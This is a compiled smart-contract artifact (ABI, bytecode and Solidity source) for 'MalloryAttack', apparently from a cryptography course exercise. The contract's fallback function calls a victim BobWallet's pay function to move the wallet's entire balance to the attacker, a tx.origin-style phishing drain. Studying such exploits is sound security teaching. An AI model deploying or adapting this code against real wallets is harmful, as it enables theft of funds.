{
  "contractName": "MalloryAttack",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "balanceOfAttacker",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061021a806100606000396000f3fe6080604052600436106100225760003560e01c8063de45197f1461002e57610023565b5b61002c33610059565b005b34801561003a57600080fd5b50610043610100565b6040516100509190610121565b60405180910390f35b8073ffffffffffffffffffffffffffffffffffffffff1663c407687660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b81526004016100cb9291906101bb565b600060405180830381600087803b1580156100e557600080fd5b505af11580156100f9573d6000803e3d6000fd5b5050505050565b600047905090565b6000819050919050565b61011b81610108565b82525050565b60006020820190506101366000830184610112565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061018161017c6101778461013c565b61015c565b61013c565b9050919050565b600061019382610166565b9050919050565b60006101a582610188565b9050919050565b6101b58161019a565b82525050565b60006040820190506101d060008301856101ac565b6101dd6020830184610112565b939250505056fea2646970667358221220fd21a58a2757b3395dbc3c95f63685755888b12fea66a7f1c7e8eb41ea37726164736f6c634300080c0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\nimport \"./IBobWallet.sol\";\n\ncontract MalloryAttack {\n    address payable attacker;\n\n    constructor() {\n        attacker = payable(msg.sender);\n    }\n\n    function balanceOfAttacker() external view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function attack(address wallet) internal {\n        BobWallet(wallet).pay(attacker, wallet.balance);\n\n    }\n\n    fallback() external payable {\n        attack(msg.sender);\n    }\n}",
  "sourcePath": "/home/mark/crypto/final22/7/contracts/MalloryAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.12+commit.f00d7308.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2022-02-21T17:44:05.002Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}